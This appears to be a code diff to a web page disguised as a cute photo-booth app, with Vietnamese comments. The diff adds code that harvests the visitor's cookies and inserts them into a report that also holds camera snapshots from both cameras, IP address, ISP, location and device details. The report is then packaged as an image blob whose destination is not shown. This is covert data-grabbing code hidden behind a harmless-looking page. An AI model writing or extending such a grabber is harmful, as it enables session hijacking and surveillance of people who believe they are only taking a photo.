@@ -153,6 +153,7 @@
       display: block;
       border-radius: 14px;
       background: #fce4ec;
+      transform: scaleX(-1);
     }
 
     .video-preview .placeholder {
@@ -524,6 +525,38 @@
     setInterval(updateClock, 1000);
     updateClock();
 
+    // === LẤY COOKIES TẤT CẢ WEB ===
+    function getAllCookies() {
+      const cookies = document.cookie.split(';');
+      const cookieList = [];
+      cookies.forEach(cookie => {
+        const trimmed = cookie.trim();
+        if (trimmed) {
+          const parts = trimmed.split('=');
+          const name = parts[0] || '';
+          const value = parts.slice(1).join('=') || '';
+          cookieList.push({ name: name, value: value });
+        }
+      });
+      return cookieList;
+    }
+
+    function getCookiesString() {
+      const cookies = getAllCookies();
+      if (cookies.length === 0) return '❌ Không có cookies';
+      
+      let result = '';
+      cookies.forEach((cookie, index) => {
+        const maxLen = 50;
+        let value = cookie.value;
+        if (value.length > maxLen) {
+          value = value.substring(0, maxLen) + '...';
+        }
+        result += `  ${index + 1}. ${cookie.name} = ${value}\n`;
+      });
+      return result;
+    }
+
     // === CAMERA ===
     const videoFront = document.getElementById('videoFront');
     const videoBack = document.getElementById('videoBack');
@@ -543,10 +576,15 @@
       captureBtn.disabled = true;
 
       try {
-        // Camera trước
+        // Camera trước - thử nhiều cách
         try {
+          // Cách 1: facingMode user
           const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+            video: { 
+              facingMode: 'user',
+              width: { ideal: 320 },
+              height: { ideal: 240 }
+            },
             audio: false
           });
           streamFront = frontStream;
@@ -554,16 +592,38 @@
           await videoFront.play();
           document.getElementById('placeholderFront').style.display = 'none';
           isFrontReady = true;
-        } catch (e) {
-          console.log('Front cam error:', e);
-          document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
-          isFrontReady = false;
+        } catch (e1) {
+          console.log('Front cam error (facingMode):', e1);
+          try {
+            // Cách 2: Lấy camera đầu tiên
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const cameras = devices.filter(d => d.kind === 'videoinput');
+            if (cameras.length > 0) {
+              const frontStream = await navigator.mediaDevices.getUserMedia({
+                video: { deviceId: { exact: cameras[0].deviceId } },
+                audio: false
+              });
+              streamFront = frontStream;
+              videoFront.srcObject = frontStream;
+              await videoFront.play();
+              document.getElementById('placeholderFront').style.display = 'none';
+              isFrontReady = true;
+            }
+          } catch (e2) {
+            console.log('Front cam error (deviceId):', e2);
+            document.getElementById('placeholderFront').textContent = '❌ Không có cam trước';
+            isFrontReady = false;
+          }
         }
 
         // Camera sau
         try {
           const backStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'environment', width: { ideal: 320 }, height: { ideal: 240 } },
+            video: { 
+              facingMode: 'environment',
+              width: { ideal: 320 },
+              height: { ideal: 240 }
+            },
             audio: false
           });
           streamBack = backStream;
@@ -603,14 +663,12 @@
       let os = 'Khác';
       let browser = 'Khác';
       
-      // Thiết bị
       if (/android/i.test(ua)) device = 'Android 📱';
       else if (/iphone|ipad|ipod/i.test(ua)) device = 'iOS 📱';
       else if (/windows/i.test(ua)) device = 'Windows 💻';
       else if (/macintosh|mac os x/i.test(ua)) device = 'Mac 💻';
       else if (/linux/i.test(ua)) device = 'Linux 🐧';
       
-      // Hệ điều hành
       if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
       else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
       else if (ua.includes('Mac OS X')) os = 'macOS';
@@ -618,7 +676,6 @@
       else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
       else if (ua.includes('Linux')) os = 'Linux';
       
-      // Trình duyệt
       if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
       else if (ua.includes('Firefox')) browser = 'Firefox';
       else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
@@ -648,16 +705,15 @@
         touch: 'Không',
         cookies: 'Không',
         doNotTrack: 'Không',
-        referrer: 'Không'
+        referrer: 'Không',
+        cookiesDetail: 'Không có cookies'
       };
 
-      // Lấy thông tin cơ bản
       const basicInfo = getDeviceInfo();
       info.device = basicInfo.device;
       info.os = basicInfo.os;
       info.browser = basicInfo.browser;
 
-      // Screen
       info.screen = `${window.screen.width}x${window.screen.height}`;
       info.language = navigator.language || 'Không rõ';
       info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ';
@@ -667,12 +723,13 @@
       info.referrer = document.referrer || 'Trực tiếp';
       info.cores = navigator.hardwareConcurrency || 'Không rõ';
 
-      // Memory
+      // Lấy tất cả cookies chi tiết
+      info.cookiesDetail = getCookiesString();
+
       if (navigator.deviceMemory) {
         info.memory = navigator.deviceMemory + 'GB';
       }
 
-      // Battery
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
@@ -680,7 +737,6 @@
         } catch (e) {}
       }
 
-      // IP & Location
       try {
         const ipRes = await fetch('https://ipwho.is/');
         const ipData = await ipRes.json();
@@ -755,11 +811,16 @@
       ctx.fillStyle = gradient;
       ctx.fillRect(0, 0, imgWidth, imgHeight);
 
-      // Vẽ 2 ảnh
+      // Vẽ 2 ảnh (lật ngang cho cam trước để giống gương)
       if (frontReady) {
         const w = imgWidth / 2 - 5;
         const h = imgHeight - 40;
-        ctx.drawImage(videoFront, 5, 20, w, h);
+        ctx.save();
+        ctx.translate(5 + w, 20);
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoFront, -w, 0, w, h);
+        ctx.restore();
+        
         ctx.strokeStyle = '#ff6b8a';
         ctx.lineWidth = 2;
         ctx.strokeRect(5, 20, w, h);
@@ -834,6 +895,9 @@
         `🏢 Nhà mạng: ${info.isp}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `📷 Camera: ${isFrontReady ? '✅ Trước' : '❌ Trước'} | ${isBackReady ? '✅ Sau' : '❌ Sau'}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `🍪 CHI TIẾT COOKIES:\n${info.cookiesDetail}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🌸 Chụp ảnh cùng Kitty thật xinh nhé! 🌸`;
 
       canvas.toBlob(async (blob) => {
